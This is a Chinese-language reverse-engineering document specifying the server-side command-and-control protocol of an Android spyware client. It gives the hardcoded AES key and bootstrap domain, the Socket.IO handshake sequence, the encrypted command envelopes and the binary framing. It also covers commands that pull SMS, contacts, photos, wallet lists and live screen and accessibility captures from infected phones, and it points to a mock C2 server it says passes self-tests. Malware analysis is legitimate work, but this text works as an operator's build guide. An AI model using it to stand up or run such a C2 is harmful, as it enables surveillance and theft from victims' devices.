# 04 · 服务端（C2）协议契约

> 问：服务器那边怎么接收？协议有约定吗？
> 答：**有，而且约定非常硬**——客户端用的是打包进来的 `socket.io-client`/`engine.io-client`（协议版本固定）＋自定义二进制通道，服务端必须逐字节满足这些约定，否则客户端不会上线、不会执行指令、甚至不会发送数据。
> 本文把“服务端必须怎么实现”写成可执行契约，并给出**参照实现 + 全链路自测**（`tools_c2/mock_c2_server.py`，10/10 PASS）。

---

## 1. 契约锚点（版本决定一切）

| 锚点 | 值 | 证据 |
|---|---|---|
| Engine.IO 协议版本 | **3**（不是 4） | `io/socket/engineio/client/Socket.java`：`public static final int PROTOCOL = 3`；`createTransport()` 中 `map.put("EIO","3")` |
| Socket.IO 协议版本 | **4** | `io/socket/parser/Parser.java`：`public static final int protocol = 4`；包前缀 `40` / `41` / `42` |
| 传输 | 仅 `websocket`，`upgrade=false`、`multiplex=false` | `C0809.m1741()`：`options.transports = {WebSocket.NAME}` |
| TLS | 客户端**信任任意证书** + `HostnameVerifier` 恒真 | `p086/AbstractC0811`、`App.onCreate` 的全局 `TrustManager`/`HostnameVerifier` |
| 应用层加密 | `AES/ECB/PKCS5`，key `0623U25KTT3YO8P9`，Base64 | `p081/C0762`、`p008/C0272` |
| 二进制通道 | 完全自定义，见 §5 | `p086/C0793`、`C0813`、`C0814` |

> 结论：**服务端不是一个“随便的 WebSocket 服务”**。若用 EIO=4 的 socket.io 4.x 服务端（常见默认），握手会直接失败——这是实现时第一个坑。

## 2. 服务端必须提供的端点

| # | 端点 | 方法 | 是否必需 | 客户端超时 |
|---|---|---|---|---|
| A | `/adv.php?apk=10068&device=<id>` | GET | **必需**（无它则拿不到 host/port/token） | connect 5s / read 5s |
| B | `/io<port>/` (WebSocket upgrade, EIO=3) | GET+Upgrade | **必需**（控制通道） | connect 30s / engine timeout 50s |
| C | `/ws/binary-device?deviceId=<id>` (WebSocket) | GET+Upgrade | 期望存在（数据通道；缺失时客户端仅保留 B，功能降级但不掉线） | connect 15s / read 0 |
| D1 | `/api/device_log` | POST | 可选（客户端只读状态码，忽略响应体） | 5s |
| D2 | `/api/ocr-captcha` | POST | 可选（验证码自动识别时才用） | 10s |
| D3 | `/api/battery_config` | GET | 可选（OEM 提权关键字下发） | — |

同一 IP/端口可以同时承载 A/B/C/D：客户端的 Socket.IO 与二进制 WS 都走 **443**（`C0798.m1718` 固定 443），而 `adv.php` 走 `www.<domain>`。

## 3. 端点 A：引导接口契约

### 请求

```
GET /adv.php?apk=10068&device=<android_id>
```

### 响应（**JSON，且必须含 `token`**）

```json
{"token": "<Base64(AES-ECB-PKCS5( {"host":"...","domain":"...","port":"..."} ))>"}
```

- `token` 的明文是 JSON，字段：`host`（子域或全域名）、`domain`、`port`（**字符串**，客户端 `Integer.parseInt`）。
- 加密：`AES/ECB/PKCS5Padding`，key `0623U25KTT3YO8P9`，`Base64.NO_WRAP`。服务端生成示例：

```python
from c2_crypt import encrypt          # tools_c2/c2_crypt.py
token = encrypt('{"host":"www","domain":"cohuducox.com","port":"3000"}')
```

### 客户端的校验顺序（决定服务端容错点）

1. `resp.isSuccessful()` 且 `body != null`
2. `JSONObject(text).has("token")` —— 不含 `token` 则视为失败，**不会**用其他字段
3. `decrypt(token)` → 必须能解析为 JSON，否则 `JSONException` → 失败
4. `host`（默认 `"www"`）、`domain`（默认 `"cohuducox.com"`）、`port`（默认 `"3000"`，`parseInt`）
5. **若 `host` 不含 `.`，则拼接 `host + "." + domain`**（`{"host":"gw","domain":"x.com"}` → `gw.x.com`）

失败后：记 `Quick probe failed` → 交给 `DomainProber`（同一 URL、同契约重试一次）→ 仍失败则 8s 后重连（无限循环）。**所以服务端只要 A 返回合法 token，客户端就必然继续走 B。**

> 注意：`adv.php` 的域名是硬编码 `www.cohuducox.com`；C2 侧通过“换 host/port”实现迁移，`adv.php` 本身必须长期在线，否则新装机无法引导。

## 4. 端点 B：Socket.IO 会话契约（逐包时序）

### 4.1 连接 URL

```
wss://{host}/io{port}/?apkid=10068&line=<token>&cmode=test&device=<android_id>&ver=v4.0&EIO=3&transport=websocket
```

- `{host}` 来自 token；**端口不进 authority**（走 443）。
- `/io{port}` 中的 `port` 来自 token（`C0809`：`options.path = "/io" + port`）——服务端必须按 path 里的数字区分线路。
- `EIO=3`、`transport=websocket` 由 engine.io 客户端追加；`sid` 仅在复用旧会话时追加。
- **查询参数顺序不固定**（HashMap 序列化），服务端务必按键解析。

### 4.2 必需时序（服务端视角）

```
客户端                                 服务端
  │ ── WS Upgrade ─────────────────────▶ │
  │ ◀── 101 Switching Protocols ───────  │
  │ ◀── "0{...sid,upgrades:[],pingInterval,pingTimeout}"   ← engine.io OPEN（文本帧）
  │ ◀── "40{sid:...}"                    ← socket.io CONNECT("/")  ★必须服务端主动发
  │ ── "2"（每 pingInterval 一次）─────▶ │
  │ ◀── "3"                              ← pong（EIO3 是客户端 ping / 服务端 pong）
  │ ── '42["login","<android_id>"]' ───▶ │
  │ ── '42["deviceOnline",{...}]' ─────▶ │
  │ ── '42["enc msg","<b64>"]' ────────▶ │   ← 业务上行（AES 信封）
  │ ◀── '42["new_msg","<b64>"]'         │   ← 业务下行（AES 信封）
  │ ◀── '42["webrtcOffer",{sdp}]'       │   （可选）
```

**★ 关键约定**：客户端对默认命名空间 `/` **不会发送 CONNECT**——`io/socket/client/Socket.java#onopen()` 里 `if ("/".equals(this.nsp)) return;`。若服务端不主动发 `40`，客户端的 `onconnect()` 永不触发，`login`/`deviceOnline` 也就永不发送，表现为“连上了但一直不上线”。

### 4.3 事件表（服务端收发）

| 方向 | 事件 | 载荷类型 | 服务端处理要求 |
|---|---|---|---|
| C→S | `login` | **裸字符串**（`android_id`） | 首次识别设备；不要求回执 |
| C→S | `deviceOnline` | JSON 对象（20+ 字段，含 `deviceInfo`、可选 `wallpaper`） | 建档；字段见 02 文档 §2.2 |
| C→S | `enc msg` | **Base64 字符串** | 必须 `AES/ECB/PKCS5` 解密 → `{action,type:"enc",data}` |
| S→C | `new_msg` | **Base64 字符串** | 必须加密后再发（明文会导致客户端 `Message parse error` 并丢弃） |
| S→C | `webrtcOffer` / `webrtcIce` / `webrtcStop` | JSON | 推流协商（可选） |
| S→C | `41`（DISCONNECT）/ 关闭帧 | — | 结束会话 |

### 4.4 下行指令信封（必须加密）

```json
{"action":"<指令名>","data":{...}}
```
→ `Base64(AES-ECB-PKCS5(该 JSON))` → `emit("new_msg", <base64>)`

客户端解密失败时会**把密文原样当明文**（`C0762.m1543` 的 `catch` 返回入参），随后 `new JSONObject()` 抛异常 → 记 `Message parse error` → **指令被丢弃**。因此：
- 必须使用同一 key 加密；
- 不要发送带 `\n` 的 Base64（客户端解码用 DEFAULT 可容忍，但服务端侧保持一致更安全）；
- `data` 可缺省，缺省时 envelope 自身即参数对象。

### 4.5 上行业务与“请求-响应”约定

客户端没有 ACK 机制；**所有“回包”都是新的 `enc msg` 上行事件**，靠 `action` 名 + `fromAdmin` 字段关联：

```jsonc
// 服务端下发（data 内可带自己的关联 ID，客户端会原样回带）
{"action":"readSmsList","data":{"curpage":0,"pagesize":9999,"fromAdmin":"req-42"}}
// 客户端上行
{"action":"smsList","type":"enc","data":{"data":[…],"total":120,"curpage":0,
                                          "fromAdmin":"req-42","deviceId":"<id>"}}
```

已确认会回带 `fromAdmin` 的指令：`readSmsList`、`readContactList`、`readAlbumList`、`readAlbumLast`、`readAlbumThumbnail`、`iconList`、`walletList`、`reqPerList`、`fetchIcon`（`RunnableC0795` 各 case 中 `jSONObjectM2008.put("fromAdmin", …)`）。
**服务端应把 `fromAdmin` 当作 request-id 使用**；不带它也能工作，但无法多请求并发关联。

## 5. 端点 C：二进制 WebSocket 契约

### 5.1 连接

```
wss://{host}:443/ws/binary-device?deviceId=<android_id>
```
- 端口**固定 443**（与 A/B 的 `port` 无关）。
- 无自定义子协议，标准 WS 升级；客户端 `readTimeout=0`、`pingInterval=30s`。

### 5.2 帧格式（双方一致）

```
+--------+----------------------------+--------------------------+
| type   | length (int32, BIG-ENDIAN) | payload (length 字节)     |
| 1 byte | 4 bytes                    | UTF-8 JSON 或 二进制      |
+--------+----------------------------+--------------------------+
```

### 5.3 服务端必须遵守的规则

| 规则 | 依据 |
|---|---|
| **首帧由客户端发**：`type=48`，payload `{"deviceId":"<id>","apkId":10068}` | `C0813.onOpen` |
| 帧长 `< 5` 字节 → 客户端丢弃 | `C0813.onMessage`：`length < 5 → null` |
| `length > payload剩余` 或 `< 0` → 客户端丢弃 | 同上：`i < 0 \|\| i > len-5 → null` |
| 服务端**只能**用 `type=16` 下发指令；`type=33` 仅作 pong 语义 | `C0813`：`if (b2 != 16) { if (b2 != 33) log("Unknown frame type") ; return; }` |
| `type=16` 的 payload 必须是合法 UTF-8 JSON，且含 `action`（`data` 可选） | `C0813`：`new JSONObject(...optString("action",""))` |
| 指令 JSON 与 Socket.IO 通道**共用同一 163 条 action 表** | `C0797.m1635` |
| 客户端不发送 ACK；服务端不应等待确认 | 全代码无 ack 逻辑 |

### 5.4 客户端上行帧（服务端解析方式）

| type | 内容 | 解析 |
|---:|---|---|
| 1 | 屏幕帧，JPEG（`FFD8…FFD9`）或 PNG | 直接落盘/解码；`m1717` 发送前只加 5 字节头 |
| 2 | 无障碍 UI 树 | JSON：`{deviceId,pkg:"capture",ac,w,h,iw,ih,orient,deviceInfo{...},action:null,zip}`，`zip = Base64(gzip(<hierarchy> XML))` |
| 4 | 缩略截图 JPEG | 直接解码 |
| 6 | HD 串流帧（MediaProjection） | 直接解码（帧率/质量由 `startHD` 的 `fps/quality/width/height` 决定） |
| 7 | adb `uiautomator dump` 树 | 同 type=2，`ac:"adb"`，`zip` 为 gzip+Base64 |
| 33 | PONG（客户端对服务端 ping 的应答；一般不会出现） | 忽略 |
| 48 | 握手 | 见 5.3 |

> gzip 而非 zlib/deflate；Base64 为 `NO_WRAP`。解压后是 XML 文本，节点属性含 `text/class/package/bounds/clickable/...`。

## 6. 端点 D：HTTP 旁路的响应约束（易踩坑）

| 端点 | 服务端应返回 | 约束（来自客户端实现） |
|---|---|---|
| `POST /api/device_log` | 任意 200（如 `{"ok":1}`） | 客户端只取 `getResponseCode()`，响应体被忽略 |
| `POST /api/ocr-captcha` | `{"text":"1234"}` | 客户端**只做一次 `read(byte[4096])` 就解析**：响应必须 **≤4KB**、且一次 TCP 读即可到达（建议 `Content-Length` + 不分块、不延迟） |
| `GET /api/battery_config` | `{"battery_entry_kw":["电池",…],"unrestricted_kw":["无限制",…]}` | 同样**单次 `read(8192)`**：≤8KB、一次性到达；字段为字符串数组，用于 OEM 后台页关键字；缺失字段则沿用内置词表 |

`device_log` 的请求体结构（服务端可据此建日志）：`{"type":"conn|acc_lifecycle|captcha","event":"…","reason":"…","thread":"…","ts":…,"stack":"…","deviceId":"…"}`。

## 7. 时序与重试预算（服务端容量规划）

| 客户端行为 | 参数 | 对服务端的要求 |
|---|---|---|
| 引导请求 | connect/read 5s | 5s 内返回 token |
| Socket.IO 连接 | connect 30s、engine timeout 50s、pingInterval 25s | 50s 内完成 `0`+`40`；持续回应 `2`→`3`（否则 `pingTimeout` 掉线） |
| 二进制通道 | connect 15s、read 0、ping 30s | 15s 内 101；可长期静默，但须回应 WS ping 控制帧 |
| 断线重连 | Socket.IO 8s 节流；二进制最多 5 次，退避 `n×30s` | 需容忍同一 `deviceId` 8s 级重连风暴；`/io{port}` 与 `/ws/binary-device` 都会被重复建连 |
| 连接卡死 | `isConnecting` 超 60s 强制复位 | 服务端不要“接受连接后长时间不回任何包” |
| 关闭 | 客户端以 `1000` 正常关闭 | 服务端应以 `1000` 关闭，异常关闭会触发重连 |

## 10. 契约陷阱清单（服务端实现排错顺序）

1. **EIO 版本**：必须 `EIO=3` 语义（客户端 `2`→服务端 `3`）。用 socket.io 4.x（EIO=4，服务端 ping）会握手即失败。
2. **不主动发 `40`** → 客户端“连上但不上线”（最隐蔽的坑）。
3. **path 带 port**：`/io3000/` 而不是 `/socket.io/`；`adv.php` 返回的 `port` 决定这段路径。
4. **端口不在 authority**：`wss://host/io3000/`，不是 `wss://host:3000/`（二进制通道才是 `:443`）。
5. **查询参数顺序不定**：按 key 解析；`line` 里是含 `+ / =` 的 Base64，**必须做 URL 解码**。
6. **`new_msg` 必须加密**：明文会被丢弃并只留日志。
7. **`token` 明文 `port` 是字符串**：`"3000"`，客户端 `parseInt`。
8. **`host` 拼 domain**：`host` 不含 `.` 时服务端给的 `host` 会被拼成 `host.domain`。
9. **二进制帧**：长度是 **int32 大端**、头 5 字节、`type` 在前；只认 `16`（指令）/`33`（pong）。
10. **`ocr-captcha`/`battery_config` 响应必须小且一次到达**（4KB / 8KB、单次 `read`）。
11. **gzip + Base64(NO_WRAP)**：UI 树字段是 gzip 而非 deflate；直接 `zlib.decompress` 会失败（需 `wbits=31` 或 `gzip`）。
12. **`fromAdmin` 关联**：想并发下发多条数据采集指令，必须自带并回读该字段。
13. **多设备并发**：`deviceId` 只来自 `android_id`，可被伪造/重复；服务端不要把它当唯一可信身份，也不要指望它稳定（恢复出厂会变）。
